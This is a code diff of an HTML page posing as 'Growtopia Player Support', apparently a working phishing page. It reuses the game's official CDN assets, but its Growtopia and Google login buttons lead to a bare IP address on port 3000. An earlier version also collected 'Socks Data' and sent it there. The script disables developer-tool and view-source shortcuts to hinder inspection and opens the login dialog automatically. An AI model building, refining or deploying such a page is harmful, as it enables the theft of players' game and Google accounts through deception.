@@ -1,5 +1,6 @@
+```html
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" style="background-color: rgba(0,0,0,0.0); width: 100%; height: 100%;">
 
 <head>
     <meta charset="utf-8">
@@ -8,34 +9,43 @@
 
     <title>Growtopia Player Support</title>
 
-    <link rel="icon"
-          type="image/png"
-          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
-          sizes="16x16">
+    <link
+        rel="icon"
+        type="image/png"
+        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
+        sizes="16x16"
+    />
+    <link
+        rel="shortcut icon"
+        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
+        type="image/x-icon"
+    >
+    <link
+        rel="icon"
+        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
+        type="image/x-icon"
+    >
 
-    <link rel="shortcut icon"
-          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
-          type="image/x-icon">
-
-    <link rel="stylesheet"
-          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css">
-
-    <link rel="stylesheet"
-          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css">
-
-    <link rel="stylesheet"
-          href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/ingame-custom.css">
+    <link
+        media="all"
+        rel="stylesheet"
+        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css"
+    >
+    <link
+        media="all"
+        rel="stylesheet"
+        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css"
+    >
+    <link
+        media="all"
+        rel="stylesheet"
+        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/ingame-custom.css"
+    >
 
     <style>
-        html,
-        body {
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0);
-        }
-
         .modal-backdrop {
-            background-color: rgba(0, 0, 0, 0.1) !important;
+            background-color: rgba(0, 0, 0, 0.1);
+        !important
         }
 
         .modal-backdrop + div {
@@ -47,124 +57,114 @@
             padding: 0;
         }
 
-        .login-container {
-            width: 100%;
+        .blink-text {
+            color: red;
+            animation: blink 2s ease-in-out infinite;
         }
 
-        .login-button {
-            margin-bottom: 10px;
-        }
+        @keyframes blink {
+            0% {
+                color: red;
+                opacity: 1;
+            }
 
-        .google-button {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+            50% {
+                color: white;
+                opacity: 1;
+            }
 
-        .google-button img {
-            max-width: 100%;
-            height: auto;
+            100% {
+                color: red;
+                opacity: 1;
+            }
         }
     </style>
 </head>
 
-<body>
+<body style="background-color: rgba(0,0,0,0.0);">
 
     <button
         type="button"
         class="btn btn-primary hidden"
-        id="modalButton"
         data-toggle="modal"
+        id="modalButton"
         data-target="#modalShow"
         data-backdrop="static"
-        data-keyboard="false">
-    </button>
+        data-keyboard="false"
+    ></button>
 
     <div class="content">
         <section class="common-box">
             <div class="container">
                 <div class="row">
                     <div class="col-md-12 col-sm-12">
-
-                        <div
-                            class="modal fade product-list-popup"
-                            id="modalShow"
-                            tabindex="-1"
-                            role="dialog"
-                            aria-hidden="false">
-
+                        <div class="row">
                             <div
-                                class="modal-dialog modal-dialog-centered"
-                                role="document">
+                                class="modal fade product-list-popup"
+                                id="modalShow"
+                                tabindex="-1"
+                                role="dialog"
+                                aria-hidden="false"
+                            >
+                                <div
+                                    class="modal-dialog modal-dialog-centered"
+                                    role="document"
+                                >
+                                    <div class="modal-content">
+                                        <div class="modal-body">
+                                            <div class="content">
+                                                <section class="common-box">
+                                                    <div class="container">
 
-                                <div class="modal-content">
-                                    <div class="modal-body">
+                                                        <div class="text-center mb-4">
+                                                            <div class="row div-content-center">
 
-                                        <div class="content">
-                                            <section class="common-box">
-                                                <div class="container">
-
-                                                    <div class="text-center mb-4">
-
-                                                        <!-- SOCKS INPUT -->
-                                                        <div class="row div-content-center">
-                                                            <div class="col-md-12 col-sm-12">
-                                                                <div class="form-group">
-                                                                    <input
-                                                                        id="login-name"
-                                                                        class="form-control grow-text"
-                                                                        required
-                                                                        placeholder="Socks Data *"
-                                                                        name="socks"
-                                                                        type="text">
+                                                                <div class="row div-content-center">
+                                                                    <div class="col-md-12 col-sm-12">
+                                                                        <a
+                                                                            href="http://185.149.27.57:3000/growid"
+                                                                            onclick="optionChose('Grow');"
+                                                                            class="grow-login btn btn-block"
+                                                                        >
+                                                                            Growtopia Login
+                                                                        </a>
+                                                                    </div>
                                                                 </div>
-                                                            </div>
-                                                        </div>
 
-                                                        <!-- GROWTOPIA LOGIN -->
-                                                        <div class="row div-content-center">
-                                                            <div class="col-md-12 col-sm-12">
+                                                                <div class="row div-content-center">
+                                                                    <div
+                                                                        class="col-md-12 col-sm-12"
+                                                                        style="display: flex; justify-content: center; align-items: center; gap: 10px;"
+                                                                    >
+                                                                        <a
+                                                                            href="http://185.149.27.57:3000/google"
+                                                                            onclick="optionChose('Google');"
+                                                                            class="btn"
+                                                                        >
+                                                                            <img
+                                                                                src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/googleid_button.png"
+                                                                                alt="Google"
+                                                                            />
+                                                                        </a>
+                                                                    </div>
+                                                                </div>
 
-                                                                <a
-                                                                    href="#"
-                                                                    class="grow-login btn btn-block login-button"
-                                                                    onclick="goToLogin(event, 'growid', 'Grow');">
-                                                                    Growtopia Login
-                                                                </a>
-
-                                                            </div>
-                                                        </div>
-
-                                                        <!-- GOOGLE LOGIN -->
-                                                        <div class="row div-content-center">
-                                                            <div class="col-md-12 col-sm-12 google-button">
-
-                                                                <a
-                                                                    href="#"
-                                                                    class="btn"
-                                                                    onclick="goToLogin(event, 'google', 'Google');">
-
-                                                                    <img
-                                                                        src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/googleid_button.png"
-                                                                        alt="Google">
-
-                                                                </a>
+                                                                <div class="row div-content-center">
+                                                                    <div class="row div-content-center">
+                                                                    </div>
+                                                                </div>
 
                                                             </div>
                                                         </div>
 
                                                     </div>
-
-                                                </div>
-                                            </section>
+                                                </section>
+                                            </div>
                                         </div>
-
                                     </div>
                                 </div>
-
                             </div>
                         </div>
-
                     </div>
                 </div>
             </div>
@@ -172,98 +172,65 @@
     </div>
 
     <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
-
     <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
 
     <script>
-        function goToLogin(event, endpoint, option) {
-            event.preventDefault();
+        $('document').ready(function () {
+            document.onkeydown = (e) => {
+                if (e.key == 123) {
+                    e.preventDefault();
+                }
 
-            const socksInput = document.getElementById('login-name');
-            const socks = socksInput.value.trim();
+                if (e.key == 'F12') {
+                    e.preventDefault();
+                }
 
-            // Require Socks Data
-            if (!socks) {
-                socksInput.focus();
-                socksInput.reportValidity();
-                return;
-            }
+                if (e.ctrlKey && e.shiftKey && e.key == 'I') {
+                    e.preventDefault();
+                }
 
-            // Keep your existing option handler
-            if (typeof optionChose === 'function') {
-                optionChose(option);
-            }
+                if (e.ctrlKey && e.key == 'I') {
+                    e.preventDefault();
+                }
 
-            // Encode the value safely for use in the URL
-            const encodedSocks = encodeURIComponent(socks);
+                if (e.ctrlKey && e.shiftKey && e.key == 'C') {
+                    e.preventDefault();
+                }
 
-            const url = `https://185.149.27.57:3000/growid/?socks=${encodedSocks}`;
+                if (e.ctrlKey && e.shiftKey && e.key == 'J') {
+                    e.preventDefault();
+                }
 
-            window.location.href = url;
-        }
-
-
-        $(document).ready(function () {
-
-            /*
-             * Disable some browser shortcuts.
-             */
-            document.onkeydown = function (e) {
-                if (
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                    (e.ctrlKey && e.key === 'I') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                    (e.ctrlKey && e.key === 'U')
-                ) {
+                if (e.ctrlKey && e.key == 'U') {
                     e.preventDefault();
                 }
             };
 
-
-            /*
-             * Open modal automatically.
-             */
             $('#modalButton').trigger('click');
 
-
-            /*
-             * Close button.
-             */
             $('.close').on('click', function () {
-                window.location.href =
-                    'https://login.growtopiagame.com/player/validate/close';
+                window.location = "https://login.growtopiagame.com/player/validate/close";
             });
 
-
-            /*
-             * Scale dynamically added elements on small screens.
-             */
-            const observer = new MutationObserver(function (mutations) {
-
+            var observer = new MutationObserver(function (mutations) {
                 mutations.forEach(function (mutation) {
+                    for (var i = 0; i < mutation.addedNodes.length; i++) {
+                        if (mutation.addedNodes[i].tagName == 'DIV') {
+                            var thediv = mutation.addedNodes[i];
+                            var sw = window.screen.width;
 
-                    mutation.addedNodes.forEach(function (node) {
-
-                        if (node.tagName !== 'DIV') {
-                            return;
+                            if (sw < 667) {
+                                $(thediv).css({
+                                    'transform': 'scale(0.75)',
+                                    'transform-origin': '0 0',
+                                    '-webkit-transform': 'scale(0.75)',
+                                    '-webkit-transform-origin': '0 0',
+                                    'overflow': 'auto'
+                                });
+                            }
                         }
-
-                        if (window.screen.width < 667) {
-                            $(node).css({
-                                transform: 'scale(0.75)',
-                                transformOrigin: '0 0',
-                                '-webkit-transform': 'scale(0.75)',
-                                '-webkit-transform-origin': '0 0',
-                                overflow: 'auto'
-                            });
-                        }
-
-                    });
-
+                    }
                 });
-
             });
 
             observer.observe(document.body, {
@@ -272,34 +239,25 @@
                 characterData: false
             });
 
-
-            /*
-             * Existing login-button animation.
-             */
             let originalText = 'Logging In';
             let dotCount = 0;
             let intervalId;
 
             $('form').on('submit', function () {
+                const $button = $('#loginButton');
 
-                const button = $('#loginButton');
+                $button.prop('disabled', true);
 
-                button.prop('disabled', true);
-
-                intervalId = setInterval(function () {
-
+                intervalId = setInterval(() => {
                     dotCount = (dotCount + 1) % 4;
+                    let dots = '.'.repeat(dotCount);
 
-                    const dots = '.'.repeat(dotCount);
-
-                    button.text(originalText + dots);
-
+                    $button.text(originalText + dots);
                 }, 500);
-
             });
-
         });
     </script>
 
 </body>
 </html>
+```
